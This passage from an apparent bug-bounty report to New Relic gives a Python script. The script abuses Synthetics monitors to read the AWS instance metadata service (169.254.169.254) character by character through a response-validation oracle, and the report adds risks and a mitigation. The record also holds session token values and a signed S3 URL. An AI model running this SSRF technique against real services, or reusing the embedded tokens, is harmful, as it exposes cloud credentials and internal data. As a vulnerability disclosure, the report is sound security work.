class=\"si\"\u003e%22\u003c/span\u003e\u003cspan class=\"s\"\u003etoken\u003c/span\u003e\u003cspan class=\"si\"\u003e%22%3\u003c/span\u003e\u003cspan class=\"s\"\u003eA\u003c/span\u003e\u003cspan class=\"si\"\u003e%22\u003c/span\u003e\u003cspan class=\"s\"\u003eY\u003c/span\u003e\u003cspan class=\"si\"\u003e%2\u003c/span\u003e\u003cspan class=\"s\"\u003eBhwhJQWlDb17uNTpQfnuPFA8bMsskQ6IgvuiSiiixS4GBbwE7xFB5F41Uqzb0tsHlpW9CukhUMWsXbUjZjpDrVDsLEZMxV1wZbhNb97LIkOCxDuDd6Nt32ggUJq1OYeYMojw0095ng50d6Zry\u003c/span\u003e\u003cspan class=\"si\"\u003e%2\u003c/span\u003e\u003cspan class=\"s\"\u003eFJfbnQUhVS2TdvP2jrLNXoikyq46FpL18fVOMnmQzEQ9r274FEIJSVr9AnVAGSW2rLa5G4tPF7BXh2GOaMgMCOH3ZjSpeRaIwKdOddc3pKFcTf6UP9CIb6tC91CXL16oU2wXXMX8D\u003c/span\u003e\u003cspan class=\"si\"\u003e%2\u003c/span\u003e\u003cspan class=\"s\"\u003eFNq6vIL21brVNi\u003c/span\u003e\u003cspan class=\"si\"\u003e%2\u003c/span\u003e\u003cspan class=\"s\"\u003eFm8v5ocNX9aalnDsjmy01zb4XgaGzesdYYUDl6wmG4SGA\u003c/span\u003e\u003cspan class=\"si\"\u003e%3\u003c/span\u003e\u003cspan class=\"s\"\u003eD\u003c/span\u003e\u003cspan class=\"si\"\u003e%3\u003c/span\u003e\u003cspan class=\"s\"\u003eD\u003c/span\u003e\u003cspan class=\"si\"\u003e%22%2\u003c/span\u003e\u003cspan class=\"s\"\u003eC\u003c/span\u003e\u003cspan class=\"si\"\u003e%22\u003c/span\u003e\u003cspan class=\"s\"\u003erefresh_token\u003c/span\u003e\u003cspan class=\"si\"\u003e%22%3\u003c/span\u003e\u003cspan class=\"s\"\u003eA\u003c/span\u003e\u003cspan class=\"si\"\u003e%22\u003c/span\u003e\u003cspan class=\"s\"\u003emCmVpRqqUpZpIyFDxMIyzaDlb6qTDt6obDVykOSqbrLslV45jrmGzWYIJoXcUgMSAkmhWcharI7TD9aEx0qh7uLz0u5llkjkzuyEtZLzNENBqKvIgaRYB7cCLWhfyc466rIEDn1z\u003c/span\u003e\u003cspan class=\"si\"\u003e%2\u003c/span\u003e\u003cspan class=\"s\"\u003eB\u003c/span\u003e\u003cspan class=\"si\"\u003e%2\u003c/span\u003e\u003cspan class=\"s\"\u003eFMb38cFuMLcR9V0USrvt\u003c/span\u003e\u003cspan class=\"si\"\u003e%2\u003c/span\u003e\u003cspan class=\"s\"\u003eFbGlSQhwbtcvb60KtSJ0f43e9DO9cIuEVT6KEV14Q6QeLT34rp9belSzOfvCA16VL9Jlb4eVktfVhQ4o0bKz0Js64bsaacEC7pSW58BeLqz4xUCiQYgh1SJp2lyG\u003c/span\u003e\u003cspan class=\"si\"\u003e%2\u003c/span\u003e\u003cspan class=\"s\"\u003eBYKooJBssHRbVu671KIiibwYI5fizivbtZD8eguXd9dTtxdhXMXigyOS9pR6w\u003c/span\u003e\u003cspan class=\"si\"\u003e%3\u003c/span\u003e\u003cspan class=\"s\"\u003eD\u003c/span\u003e\u003cspan class=\"si\"\u003e%3\u003c/span\u003e\u003cspan class=\"s\"\u003eD\u003c/span\u003e\u003cspan class=\"si\"\u003e%22%7\u003c/span\u003e\u003cspan class=\"s\"\u003eD\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e#Base URL\n\u003c/span\u003e\u003cspan class=\"n\"\u003eurl\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;https://synthetics.newrelic.com\u0026#39;\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e#URL suffixes of actions that will be used\n\u003c/span\u003e\u003cspan class=\"n\"\u003elatest_monitor\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;/accounts/1340503/monitors/015101be-7318-452a-b210-1e4c443cc0fd/results.json?includeFailed=true\u0026amp;locations=AWS_EU_WEST_1\u0026amp;locations=AWS_US_EAST_1\u0026amp;locations=LINODE_EU_WEST_1\u0026amp;orderBy=timestamp+desc\u0026amp;since=1363517150000\u0026amp;until=1564121950000\u0026#39;\u003c/span\u003e\n\u003cspan class=\"n\"\u003ejob\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;/accounts/1340503/monitors/015101be-7318-452a-b210-1e4c443cc0fd/results/REPLACEME/job\u0026#39;\u003c/span\u003e\n\u003cspan class=\"n\"\u003echange_settings\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;/accounts/1340503/monitors/015101be-7318-452a-b210-1e4c443cc0fd.json\u0026#39;\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e#Requesting the current monitor\n\u003c/span\u003e\u003cspan class=\"n\"\u003er\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003erequests\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eurl\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003elatest_monitor\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ecookies\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003ecookies\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ejson\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n\u003cspan class=\"n\"\u003eoriginal_id\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e][\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;id\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e#String that will be filled\n\u003c/span\u003e\u003cspan class=\"n\"\u003eto_find\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;\u0026#39;\u003c/span\u003e\n\n\u003cspan class=\"n\"\u003ecount\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\n\u003cspan class=\"k\"\u003ewhile\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e42\u003c/span\u003e\u003cspan class=\"p\"\u003e):\u003c/span\u003e\n    \u003cspan class=\"n\"\u003er\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003erequests\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eurl\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003elatest_monitor\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ecookies\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003ecookies\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ejson\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n    \u003cspan class=\"n\"\u003etmp_id\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e][\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;id\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003etmp_id\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"k\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eoriginal_id\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e#If the ID has changed, a new monitor state has arrived\n\u003c/span\u003e    \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003eoriginal_id\u003c/span\u003e \u003cspan class=\"o\"\u003e!=\u003c/span\u003e \u003cspan class=\"n\"\u003etmp_id\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n        \u003cspan class=\"n\"\u003er\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003erequests\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eurl\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003ejob\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;REPLACEME\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003etmp_id\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"n\"\u003ecookies\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003ecookies\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eheaders\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003eheaders\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ejson\u003c/span\u003e\u003cspan class=\"p\"\u003e()\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;URI\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;status\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\n        \u003cspan class=\"c1\"\u003e#If the status of the monitor is set to SUCCESS, our \u0026quot;Response validation\u0026quot; string is matched and we store the found character and search for a new one\n\u003c/span\u003e        \u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;status\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e \u003cspan class=\"o\"\u003e==\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;SUCCESS\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\n            \u003cspan class=\"n\"\u003eto_find\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"n\"\u003ealpha_min\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ecount\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e]\u003c/span\u003e\n            \u003cspan class=\"n\"\u003ecount\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\n        \u003cspan class=\"c1\"\u003e#We configure our job with a new \u0026quot;Response validation\u0026quot; string\n\u003c/span\u003e        \u003cspan class=\"n\"\u003eoriginal_id\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003etmp_id\u003c/span\u003e\n        \u003cspan class=\"n\"\u003euri\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;http://accountId\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s\"\u003e+:+\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s\"\u003eREPLACE@169.254.169.254.xip.io/latest/dynamic/instance-identity/document\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;REPLACE\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ealpha_min\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ecount\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\n        \u003cspan class=\"n\"\u003eaccountid\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;accountId\u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s\"\u003e : \u003c/span\u003e\u003cspan class=\"se\"\u003e\\\u0026quot;\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003eto_find\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026quot;REPLACE\u0026quot;\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003ereplace\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;REPLACE\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ealpha_min\u003c/span\u003e\u003cspan class=\"p\"\u003e[\u003c/span\u003e\u003cspan class=\"n\"\u003ecount\u003c/span\u003e\u003cspan class=\"p\"\u003e])\u003c/span\u003e\n        \u003cspan class=\"n\"\u003ex\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;id\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;015101be-7318-452a-b210-1e4c443cc0fd\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;name\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;test\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;accountId\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e1340503\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;userId\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e1616087\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;frequency\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;uri\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"n\"\u003euri\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;locations\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:[\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;AWS_EU_WEST_1\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e],\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;emails\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:[],\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;status\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;ENABLED\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;apiVersion\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;0.2.2\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;slaThreshold\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e5\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;metadata\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:{\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;nr.synthetics.metadata.job.options.simple.bypass.head\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;true\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;nr.synthetics.metadata.job.options.response-validation\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"n\"\u003eaccountid\u003c/span\u003e\u003cspan class=\"p\"\u003e},\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;conditions\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:[],\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;type\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;SIMPLE\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;permissions\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:{\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;monitor/read\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;true\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;monitor/write\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;true\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e},\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;crc\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e1899546310\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;currentChecks\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e\u003cspan class=\"mi\"\u003e43200\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n        \u003cspan class=\"n\"\u003er\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"n\"\u003erequests\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eput\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eurl\u003c/span\u003e \u003cspan class=\"o\"\u003e+\u003c/span\u003e \u003cspan class=\"n\"\u003echange_settings\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003edata\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003ejson\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003edumps\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"n\"\u003ecookies\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003ecookies\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eheaders\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"n\"\u003eheaders_put\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"k\"\u003eprint\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003er\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003etext\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n        \u003cspan class=\"n\"\u003ecount\u003c/span\u003e \u003cspan class=\"o\"\u003e+=\u003c/span\u003e \u003cspan class=\"mi\"\u003e1\u003c/span\u003e\n    \u003cspan class=\"c1\"\u003e#We sleep for 30 seconds as the jobs are received every 1 minute\n\u003c/span\u003e    \u003cspan class=\"n\"\u003etime\u003c/span\u003e\u003cspan class=\"o\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003esleep\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"mi\"\u003e30\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eWhat we do with this script is:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003ewe create a \u003ccode\u003eResponse validation\u003c/code\u003e string matching \u003ccode\u003eaccountId\u0026quot; : \u0026quot;\u003c/code\u003e on the \u003ccode\u003eMonitor URL\u003c/code\u003e set to  \u003ccode\u003ehttp://169.254.169.254.xip.io/latest/dynamic/instance-identity/document\u003c/code\u003e ;\u003c/li\u003e\n\u003cli\u003ewe the add a single character to the \u003ccode\u003eResponse validation\u003c/code\u003e string from our numeric charset string and wait one minute ;\u003c/li\u003e\n\u003cli\u003ewhen a new job has been done, we check if the \u003ccode\u003estatus\u003c/code\u003e is \u003ccode\u003eFAILURE\u003c/code\u003e or \u003ccode\u003eSUCCESS\u003c/code\u003e. If it is \u003ccode\u003eFAILURE\u003c/code\u003e we try another single character from our numeric charset, if it is \u003ccode\u003eSUCCESS\u003c/code\u003e we matched a new valid character, add it to our \u003ccode\u003eResponse validation\u003c/code\u003e string and search for the next character.\u003c/li\u003e\n\u003cli\u003ewe do this until our script fails as no more numeric characters are to be found.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eBy using this string we could determine the value of the \u003ccode\u003eaccountId\u003c/code\u003e is \u003ccode\u003e017663287629\u003c/code\u003e in the \u003ccode\u003elatest/dynamic/instance-identity/document\u003c/code\u003e file of the \u003ccode\u003eDublin, IE\u003c/code\u003e instance.\u003c/p\u003e\n\n\u003cp\u003eWe could then use the same methodology to dump all files accessible through this URL. For example the \u003ccode\u003e/latest/user-data\u003c/code\u003e file is containing a script. It is also accessible and by checking the same way with the \u003ccode\u003eResponse validation\u003c/code\u003e set to \u003ccode\u003e/bin/\u003c/code\u003e was successfully matched through a \u003ccode\u003emonitor\u003c/code\u003e.\u003c/p\u003e\n\n\u003ch2 id=\"risks\"\u003eRisks\u003c/h2\u003e\n\n\u003cp\u003eAn attacker would be able to dump all the information contained in the \u003ccode\u003e/latest/\u003c/code\u003e folder of the amazon instance.\u003c/p\u003e\n\n\u003ch2 id=\"mitigation\"\u003eMitigation\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003eDo not let it be possible to access the \u003ccode\u003e169.254.169.254\u003c/code\u003e IP address from a monitor.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003ch2 id=\"comments\"\u003eComments\u003c/h2\u003e\n\n\u003cp\u003eI did not take the time to make a more deeper script that could use multiple \u003ccode\u003emonitors\u003c/code\u003e to communicate between them to dump data faster but it can be done.\u003c/p\u003e\n\n\u003cp\u003eI hope I didn\u0026#39;t forget any important step to exploit this. It is quite difficult to exploit and to explain. Please let me know if you need any further information.\u003c/p\u003e\n\n\u003cp\u003eRegards.\u003c/p\u003e\n","weakness":{"id":18,"name":"Information Disclosure"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":96303,"file_name":"1.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/096/303/49bf69cee7f54f5fb4f77957c7f1910d2ef7c7ef/1.png?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQT66234QS%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T042827Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDSp%2BGHwVXW7fBK%2FK1nDT3bJMDMcRKjcnebqf9FCBKk%2FAIgb5aU4qkic%2BP2ixvdLyQKidiv4RPG73HNrvXKpCI2nZEqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDHxkHAFZXVcmltu4siqRA%2BuBKYL9pEqirXbS9y9NCsTy%2BN6TtBTj%2BlvlTo8VhjnR%2F2XvLfk4SwGUPrjtOfauAzMQbEyv%2FVcDPUGkk5Pb%2FRjvlrv9d1oobHMn5A6J0%2FHC65X7PIQxLjVDtwlSo4SF6ijeN9qB355sssD9sLxjax2%2BnAkD4fArFVvvToscZtB6NtOY2q0rUx347j0lgV0FrvHt8hAyqp3FQKAnU1XuYv1VMIvdrRLD9wF2wotmgZeYOcfe2K38sNBkK3SdUDyQ7fS%2ByZV%2BCE2hmUzw%2BEzRt4na30MIJecCnaDpznKHmNqJxGy2ggV8R9TunQ5ZW9o6cE4pPn6Q6qVGbiJ1EZdemRmrUmoYHi%2BSvjwM9zgKbVUmO3e972MxhiMnyHu3qKDZ5tmDVNvBqFxPYmhrotN5%2BdtShNxeA5GfjlXJX8gzYdNzvlMMH7XKrH9BYTrYhCSFNfsbJGLjgGIlyNProwCFcn8f2p4ki6p%2FJZ4lxExrMpQrJPwZiUFjJRU8X31zDnxJ0j9uX%2B0YDc6tLHQjVGxRYxQBMNn%2Fqf8FOusBoTiSBHwYwuKYDdnq9H2o1NA3EgQR2InM8n%2BKrgwQfqQvtm9eV%2BksfFYRzWT7yHSJP64JUp1GiBPDKnathP%2B%2Fjsed1LSpHlEF%2F1yiMKsxVhBmn1YdgPDBz%2FFZASz9KLYqXkr8f3WKuQnj8lcONKHMM278gSGAvqVR38RoutR8gSbzHIUb2X9CNZFwgFwpnNuood59%2B7WfO6adjW3fBIdJna7ATwsLIRJx32ec665%2FfwwRm5HMM6weh%2B7s03mYt0cXLKhnPUuQ5gRfNzn%2FgnEM5Uo71xOF7A2oylTkHNPEnfasiV7EeEt9obvbyg%3D%3D\u0026X-Amz-Signature=5bb60761f1b0de0650e4da5edfcada32dfc1f22ddbe5f5faac1f4fbc0416a2dd","file_